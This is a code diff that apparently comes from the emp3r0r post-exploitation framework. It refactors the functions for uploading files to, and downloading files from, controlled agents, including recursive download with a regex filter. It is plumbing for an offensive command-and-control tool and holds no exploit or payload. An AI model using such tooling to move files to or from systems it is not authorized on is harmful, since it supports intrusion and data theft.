@@ -7,81 +7,45 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/spf13/cobra"
 )
 
-func CmdUploadToAgent(cmd *cobra.Command, args []string) {
-	go uploadToAgent(cmd, args)
-}
-
-func uploadToAgent(cmd *cobra.Command, _ []string) {
-	target := agents.MustGetActiveAgent()
+// UploadToAgent uploads a file to an agent.
+// This is a convenience wrapper around PutFile that can be called from operator.
+func UploadToAgent(src, dst string, target *def.Emp3r0rAgent, saveToMem bool) error {
 	if target == nil {
-		logging.Errorf("You have to select a target first")
-		return
+		return fmt.Errorf("no target agent selected")
 	}
-
-	src, err := cmd.Flags().GetString("src")
-	if err != nil {
-		logging.Errorf("UploadToAgent: %v", err)
-		return
-	}
-	dst, err := cmd.Flags().GetString("dst")
-	if err != nil {
-		logging.Errorf("UploadToAgent: %v", err)
-		return
-	}
-
 	if src == "" || dst == "" {
-		logging.Errorf(cmd.UsageString())
-		return
+		return fmt.Errorf("source and destination paths are required")
 	}
 
-	saveToMem, _ := cmd.Flags().GetBool("mem")
-
-	if err := PutFile(src, dst, target, saveToMem); err != nil {
-		logging.Errorf("Cannot put %s: %v", src, err)
-	}
+	return PutFile(src, dst, target, saveToMem)
 }
 
-// let it run in the background
-func CmdDownloadFromAgent(cmd *cobra.Command, args []string) {
-	go downloadFromAgent(cmd, args)
-}
-
-func downloadFromAgent(cmd *cobra.Command, args []string) {
-	target := agents.MustGetActiveAgent()
+// DownloadFromAgent downloads a file or directory from an agent.
+// If isRecursive is true, downloads all files matching the filter regex.
+// Returns error if download fails.
+func DownloadFromAgent(target *def.Emp3r0rAgent, filePath string, isRecursive bool, filter string) error {
 	if target == nil {
-		logging.Errorf("You have to select a target first")
-		return
+		return fmt.Errorf("no target agent selected")
 	}
-	// parse command-line arguments using pflag
-	isRecursive, _ := cmd.Flags().GetBool("recursive")
-	filter, _ := cmd.Flags().GetString("regex")
-
-	file_path, err := cmd.Flags().GetString("path")
-	if err != nil {
-		logging.Errorf("download: %v", err)
-		return
-	}
-	if file_path == "" {
-		logging.Errorf("download: path is required")
-		return
+	if filePath == "" {
+		return fmt.Errorf("file path is required")
 	}
 
 	if isRecursive {
 		job_id := uuid.NewString()
-		cmd_str := fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s", file_path, strconv.Quote(filter), uuid.NewString())
-		err = ExecCmd(cmd_str, job_id, target.Tag)
+		cmd_str := fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s", filePath, strconv.Quote(filter), uuid.NewString())
+		err := ExecCmd(cmd_str, job_id, target.Tag)
 		if err != nil {
-			logging.Errorf("Cannot get %+v: %v", args, err)
-			return
+			return fmt.Errorf("cannot get file list: %v", err)
 		}
+
 		logging.Infof("Waiting for response from agent %s", target.Tag)
 		var result string
 		for i := 0; i < 10; i++ {
@@ -91,7 +55,7 @@ func downloadFromAgent(cmd *cobra.Command, args []string) {
 				logging.Infof("Got file list from %s", target.Tag)
 				live.CmdResults.Delete(job_id)
 				if result == "" {
-					logging.Errorf("Cannot get %s: empty file list in directory", file_path)
+					return fmt.Errorf("empty file list in directory: %s", filePath)
 				}
 				break
 			}
@@ -120,6 +84,7 @@ func downloadFromAgent(cmd *cobra.Command, args []string) {
 				logging.Successf("All %d files downloaded successfully", len(files))
 			}
 		}()
+
 		logging.Infof("Downloading %d files", len(files))
 		for n, file := range files {
 			ftpSh, err := GetFile(file, target)
@@ -141,9 +106,13 @@ func downloadFromAgent(cmd *cobra.Command, args []string) {
 				break
 			}
 		}
-	} else {
-		if _, err := GetFile(file_path, target); err != nil {
-			logging.Errorf("Cannot get %s: %v", strconv.Quote(file_path), err)
+
+		if len(failed_files) > 0 {
+			return fmt.Errorf("failed to download %d files", len(failed_files))
 		}
+		return nil
+	} else {
+		_, err := GetFile(filePath, target)
+		return err
 	}
 }
